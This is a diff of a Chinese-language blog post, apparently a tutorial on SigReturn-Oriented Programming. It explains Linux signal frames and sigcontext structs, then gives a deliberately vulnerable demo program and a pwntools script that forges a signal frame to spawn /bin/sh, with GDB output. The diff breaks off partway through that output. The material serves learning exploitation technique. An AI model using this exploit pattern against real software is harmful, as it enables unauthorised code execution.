@@ -1,169 +1,174 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Understanding SigReturn-Oriented-Programming | AssassinQ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  <meta name="keywords" content="ctfpwn">
-  
-  
-  
-  
-  <meta name="description" content="去年学 ROP 的时候遗漏的一个技术。">
-<meta name="keywords" content="ctf,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Understanding SigReturn-Oriented-Programming">
-<meta property="og:url" content="blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/index.html">
-<meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="去年学 ROP 的时候遗漏的一个技术。">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="/pics/Understanding-SigReturn-Oriented-Programming/1.png">
-<meta property="og:image" content="/pics/Understanding-SigReturn-Oriented-Programming/2.png">
-<meta property="og:updated_time" content="2020-03-14T03:17:29.492Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Understanding SigReturn-Oriented-Programming">
-<meta name="twitter:description" content="去年学 ROP 的时候遗漏的一个技术。">
-<meta name="twitter:image" content="/pics/Understanding-SigReturn-Oriented-Programming/1.png">
-  
-    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
-  
-  <link rel="icon" href="/css/images/favicon.ico">
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
-  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-  <style type="text/css">
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
-    
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>Understanding SigReturn-Oriented-Programming - AssassinQ</title>
 
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
-  <script src="/js/jquery-3.1.1.min.js"></script>
 
-  <!-- Bootstrap core CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.css">
-  <link rel="stylesheet" href="/css/fashion.css">
-  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
 
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
-</html>
 
 
-  <body data-spy="scroll" data-target="#toc" data-offset="50">
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
 
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-  
-  
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
-
-
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
-  <div class="clearfix container">
-      <div class="site-branding">
-
-          <h1 class="site-title">
-            
-              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
-            
-          </h1>
-          
-          
-            <div class="site-description">ZJGSU-IS-17</div>
-          
-            
-          <nav id="main-navigation" class="main-navigation" role="navigation">
-            <a class="nav-open">Menu</a>
-            <a class="nav-close">Close</a>
-
-            <div class="clearfix sf-menu">
-              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
-                    
-              </ul>
-            </div>
-          </nav>
-
-      </div>
-  </div>
-</header>
-
-
-  <div id="container">
-    <div id="wrap">
-            
-      <div id="content" class="outer">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <section id="main" style="float:none;"><article id="post-Understanding-SigReturn-Oriented-Programming" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
         
-  
-    <h1 class="thumb" itemprop="name">
-      Understanding SigReturn-Oriented-Programming
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      	<a href="/2020/03/13/Understanding-SigReturn-Oriented-Programming/" class="article-date">
-	  <time datetime="2020-03-13T08:07:27.000Z" itemprop="datePublished">March 13, 2020</time>
-	</a>
-
-       
-      
-
-	  |
-	  2.8k words
-	  |
-	  13 minute(s) to read
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="article-entry" itemprop="articleBody">
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Friday, March 13th 2020, 4:07 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      14 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
       
-        <p>去年学 ROP 的时候遗漏的一个技术。</p>
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>去年学 ROP 的时候遗漏的一个技术。</p>
 <a id="more"></a>
 <h1 id="What-is-SROP"><a href="#What-is-SROP" class="headerlink" title="What is SROP"></a>What is SROP</h1><p>SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p>
 <p>其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。</p>
 <h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
-<p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" alt="Linux下的Signal信号机制"></p>
+<p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" srcset="/img/loading.gif" alt></p>
 <ol>
 <li>首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；</li>
 <li>内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；</li>
@@ -171,11 +176,65 @@
 <li>处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。</li>
 </ol>
 <p>在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：</p>
-<p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" alt="在内核中保存进程上下文之后栈的结构"></p>
+<p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" srcset="/img/loading.gif" alt></p>
 <p>Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> &#123;</span></span><br><span class="line">	__u16				gs, __gsh;</span><br><span class="line">	__u16				fs, __fsh;</span><br><span class="line">	__u16				es, __esh;</span><br><span class="line">	__u16				ds, __dsh;</span><br><span class="line">	__u32				edi;</span><br><span class="line">	__u32				esi;</span><br><span class="line">	__u32				ebp;</span><br><span class="line">	__u32				esp;</span><br><span class="line">	__u32				ebx;</span><br><span class="line">	__u32				edx;</span><br><span class="line">	__u32				ecx;</span><br><span class="line">	__u32				eax;</span><br><span class="line">	__u32				trapno;</span><br><span class="line">	__u32				err;</span><br><span class="line">	__u32				eip;</span><br><span class="line">	__u16				cs, __csh;</span><br><span class="line">	__u32				eflags;</span><br><span class="line">	__u32				esp_at_signal;</span><br><span class="line">	__u16				ss, __ssh;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> __<span class="title">user</span>		*<span class="title">fpstate</span>;</span> <span class="comment">// FPU寄存器状态</span></span><br><span class="line">	__u32				oldmask;</span><br><span class="line">	__u32				cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<pre><code class="cpp">struct sigcontext {
+    __u16                gs, __gsh;
+    __u16                fs, __fsh;
+    __u16                es, __esh;
+    __u16                ds, __dsh;
+    __u32                edi;
+    __u32                esi;
+    __u32                ebp;
+    __u32                esp;
+    __u32                ebx;
+    __u32                edx;
+    __u32                ecx;
+    __u32                eax;
+    __u32                trapno;
+    __u32                err;
+    __u32                eip;
+    __u16                cs, __csh;
+    __u32                eflags;
+    __u32                esp_at_signal;
+    __u16                ss, __ssh;
+    struct _fpstate __user        *fpstate; // FPU寄存器状态
+    __u32                oldmask;
+    __u32                cr2;
+};
+</code></pre>
 <p>在 x64 中的 sigcontext 结构体如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> &#123;</span></span><br><span class="line">	__u64				r8;</span><br><span class="line">	__u64				r9;</span><br><span class="line">	__u64				r10;</span><br><span class="line">	__u64				r11;</span><br><span class="line">	__u64				r12;</span><br><span class="line">	__u64				r13;</span><br><span class="line">	__u64				r14;</span><br><span class="line">	__u64				r15;</span><br><span class="line">	__u64				rdi;</span><br><span class="line">	__u64				rsi;</span><br><span class="line">	__u64				rbp;</span><br><span class="line">	__u64				rbx;</span><br><span class="line">	__u64				rdx;</span><br><span class="line">	__u64				rax;</span><br><span class="line">	__u64				rcx;</span><br><span class="line">	__u64				rsp;</span><br><span class="line">	__u64				rip;</span><br><span class="line">	__u64				eflags;		<span class="comment">/* RFLAGS */</span></span><br><span class="line">	__u16				cs;</span><br><span class="line">	__u16				gs;</span><br><span class="line">	__u16				fs;</span><br><span class="line">	__u16				__pad0;</span><br><span class="line">	__u64				err;</span><br><span class="line">	__u64				trapno;</span><br><span class="line">	__u64				oldmask;</span><br><span class="line">	__u64				cr2;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> __<span class="title">user</span>		*<span class="title">fpstate</span>;</span>	<span class="comment">/* Zero when no FPU context */</span></span><br><span class="line">	__u64				reserved1[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<pre><code class="cpp">struct sigcontext {
+    __u64                r8;
+    __u64                r9;
+    __u64                r10;
+    __u64                r11;
+    __u64                r12;
+    __u64                r13;
+    __u64                r14;
+    __u64                r15;
+    __u64                rdi;
+    __u64                rsi;
+    __u64                rbp;
+    __u64                rbx;
+    __u64                rdx;
+    __u64                rax;
+    __u64                rcx;
+    __u64                rsp;
+    __u64                rip;
+    __u64                eflags;        /* RFLAGS */
+    __u16                cs;
+    __u16                gs;
+    __u16                fs;
+    __u16                __pad0;
+    __u64                err;
+    __u64                trapno;
+    __u64                oldmask;
+    __u64                cr2;
+    struct _fpstate __user        *fpstate;    /* Zero when no FPU context */
+    __u64                reserved1[8];
+};
+</code></pre>
 <h2 id="SROP-Theory"><a href="#SROP-Theory" class="headerlink" title="SROP Theory"></a>SROP Theory</h2><p>在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：</p>
 <ul>
 <li>Signal Frame 可以被用户读写；</li>
@@ -195,222 +254,609 @@
 </ul>
 <p>在 pwntools 中也集成了 SROP 的工具，即 <code>SigreturnFrame()</code>，用于构造假的 sigcontext 结构体（Signal Frame）。</p>
 <h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="comment">// 读取 0x200 字节</span></span><br><span class="line">        <span class="string">"mov rax, 0\n"</span> <span class="comment">// sys_read</span></span><br><span class="line">        <span class="string">"mov rdi, 0\n"</span> <span class="comment">// fd</span></span><br><span class="line">        <span class="string">"lea rsi, %0\n"</span> <span class="comment">// buf</span></span><br><span class="line">        <span class="string">"mov rdx, 0x200\n"</span> <span class="comment">// count</span></span><br><span class="line">        <span class="string">"syscall\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 恢复进程上下文</span></span><br><span class="line">        <span class="string">"mov rax, 15\n"</span> <span class="comment">// sys_rt_sigaction</span></span><br><span class="line">        <span class="string">"mov rdi, 0\n"</span></span><br><span class="line">        <span class="string">"mov rsp, rsi\n"</span> <span class="comment">// 把buf作为栈</span></span><br><span class="line">        <span class="comment">// syscall 的 symbol，便于查找</span></span><br><span class="line">        <span class="string">"syscall:\n"</span></span><br><span class="line">        <span class="string">"syscall\n"</span></span><br><span class="line">        <span class="string">"jmp exit\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 退出程序</span></span><br><span class="line">        <span class="string">"exit:\n"</span></span><br><span class="line">        <span class="string">"mov rax, 60\n"</span> <span class="comment">// sys_exit</span></span><br><span class="line">        <span class="string">"mov rdi, 0\n"</span></span><br><span class="line">        <span class="string">"syscall\n"</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">"m"</span> (buf)</span><br><span class="line">        :</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="cpp">char buf[0x200];
+
+int main()
+{
+    asm(
+        // 读取 0x200 字节
+        &quot;mov rax, 0\n&quot; // sys_read
+        &quot;mov rdi, 0\n&quot; // fd
+        &quot;lea rsi, %0\n&quot; // buf
+        &quot;mov rdx, 0x200\n&quot; // count
+        &quot;syscall\n&quot;
+
+        // 恢复进程上下文
+        &quot;mov rax, 15\n&quot; // sys_rt_sigaction
+        &quot;mov rdi, 0\n&quot;
+        &quot;mov rsp, rsi\n&quot; // 把buf作为栈
+        // syscall 的 symbol，便于查找
+        &quot;syscall:\n&quot;
+        &quot;syscall\n&quot;
+        &quot;jmp exit\n&quot;
+
+        // 退出程序
+        &quot;exit:\n&quot;
+        &quot;mov rax, 60\n&quot; // sys_exit
+        &quot;mov rdi, 0\n&quot;
+        &quot;syscall\n&quot;
+        :
+        : &quot;m&quot; (buf)
+        :
+        );
+}
+</code></pre>
 <p>构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造假的Signal Frame</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve <span class="comment"># 设置系统调用号为sys_execve</span></span><br><span class="line">frame.rdi = elf.symbols[<span class="string">'buf'</span>] + <span class="number">0x100</span> <span class="comment"># 设置第一个参数为偏移0x100处的“/bin/sh”字符串</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">'syscall'</span>]</span><br><span class="line"></span><br><span class="line">payload = str(frame).ljust(<span class="number">0x100</span>, <span class="string">'A'</span>) + <span class="string">'/bin/sh\x00'</span> <span class="comment"># 设置payload</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+
+p = process(&#39;./main&#39;)
+elf = ELF(&#39;./main&#39;)
+
+#gdb.attach(p)
+
+# 构造假的Signal Frame
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve # 设置系统调用号为sys_execve
+frame.rdi = elf.symbols[&#39;buf&#39;] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = elf.symbols[&#39;syscall&#39;]
+
+payload = str(frame).ljust(0x100, &#39;A&#39;) + &#39;/bin/sh\x00&#39; # 设置payload
+p.send(payload)
+
+p.interactive()
+</code></pre>
 <p>调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────── Code ────────────────────────────────────</span><br><span class="line">   0x40010a &lt;main+34&gt;:	mov    rax,0xf</span><br><span class="line">   0x400111 &lt;main+41&gt;:	mov    rdi,0x0</span><br><span class="line">   0x400118 &lt;main+48&gt;:	mov    rsp,rsi</span><br><span class="line">=&gt; 0x40011b &lt;main+51&gt;:	syscall</span><br><span class="line">   0x40011d &lt;main+53&gt;:	jmp    0x40011f &lt;main+55&gt;</span><br><span class="line">   0x40011f &lt;main+55&gt;:	mov    rax,0x3c</span><br><span class="line">   0x400126 &lt;main+62&gt;:	mov    rdi,0x0</span><br><span class="line">   0x40012d &lt;main+69&gt;:	syscall</span><br><span class="line">────────────────────────────── System call info ──────────────────────────────</span><br><span class="line">rt_sigreturn()</span><br><span class="line">───────────────────────────────── SROP info ──────────────────────────────────</span><br><span class="line">       ss_size:0x0000000000000000           rsi:0x0000000000000000</span><br><span class="line">           rax:0x000000000000003b           rbp:0x0000000000000000</span><br><span class="line">        eflags:0x0000000000000000           rcx:0x0000000000000000</span><br><span class="line">           rip:0x000000000040011b           r13:0x0000000000000000</span><br><span class="line">           cr2:0x0000000000000000           r12:0x0000000000000000</span><br><span class="line">           rbx:0x0000000000000000       uc_link:0x0000000000000000</span><br><span class="line">           err:0x0000000000000000        trapno:0x0000000000000000</span><br><span class="line">           r10:0x0000000000000000      ss_flags:0x0000000000000000</span><br><span class="line">         ss_sp:0x0000000000000000           rdi:0x0000000000600280</span><br><span class="line">      uc_flags:0x0000000000000000           r14:0x0000000000000000</span><br><span class="line">            r8:0x0000000000000000      selector:0x0000000000000033</span><br><span class="line">            r9:0x0000000000000000           rdx:0x0000000000000000</span><br><span class="line">           rsp:0x0000000000000000       oldmask:0x0000000000000000</span><br><span class="line">           r11:0x0000000000000000           r15:0x0000000000000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">──────────────────────────────────── Code ────────────────────────────────────</span><br><span class="line">   0x40010a &lt;main+34&gt;:	mov    rax,0xf</span><br><span class="line">   0x400111 &lt;main+41&gt;:	mov    rdi,0x0</span><br><span class="line">   0x400118 &lt;main+48&gt;:	mov    rsp,rsi</span><br><span class="line">=&gt; 0x40011b &lt;main+51&gt;:	syscall</span><br><span class="line">   0x40011d &lt;main+53&gt;:	jmp    0x40011f &lt;main+55&gt;</span><br><span class="line">   0x40011f &lt;main+55&gt;:	mov    rax,0x3c</span><br><span class="line">   0x400126 &lt;main+62&gt;:	mov    rdi,0x0</span><br><span class="line">   0x40012d &lt;main+69&gt;:	syscall</span><br><span class="line">────────────────────────────── System call info ──────────────────────────────</span><br><span class="line">execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)</span><br><span class="line">const char *name : 0x600280 --&gt; 0x68732f6e69622f (&apos;/bin/sh&apos;)</span><br><span class="line">const char *const *argv : 0x0</span><br><span class="line">const char *const *envp : 0x0</span><br></pre></td></tr></table></figure>
+<pre><code class="gdb">──────────────────────────────────── Code ────────────────────────────────────
+   0x40010a &lt;main+34&gt;:    mov    rax,0xf
+   0x400111 &lt;main+41&gt;:    mov    rdi,0x0
+   0x400118 &lt;main+48&gt;:    mov    rsp,rsi
+=&gt; 0x40011b &lt;main+51&gt;:    syscall
+   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;
+   0x40011f &lt;main+55&gt;:    mov    rax,0x3c
+   0x400126 &lt;main+62&gt;:    mov    rdi,0x0
+   0x40012d &lt;main+69&gt;:    syscall
+────────────────────────────── System call info ──────────────────────────────
+rt_sigreturn()
